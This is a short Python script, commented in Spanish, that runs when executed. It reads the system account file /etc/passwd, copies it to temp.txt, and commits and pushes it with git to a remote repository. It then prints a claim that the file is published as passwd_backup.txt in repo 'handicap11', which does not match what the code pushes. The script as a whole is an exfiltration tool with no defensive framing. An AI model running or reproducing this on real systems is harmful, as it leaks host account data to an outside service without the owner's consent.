import subprocess

def run():
    archivo = '/etc/passwd'
    mensaje_commit = 'Archivo passwd en GitHub'

    with open(archivo, 'r') as file:
        contenido = file.read()

    repo_nombre = 'handicap11'
    archivo_en_repo = 'passwd_backup.txt'

    with open ('temp.txt', 'w') as temp_file:
        temp_file.write(contenido)

    subprocess.run(['git', 'add', 'temp.txt'])
    subprocess.run(['git', 'commit', '-m', mensaje_commit])
    subprocess.run(['git', 'push', 'origin', 'main'])

    print(f'Archivo {archivo} publicado en GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')

# Llamamos a la función run()
run()
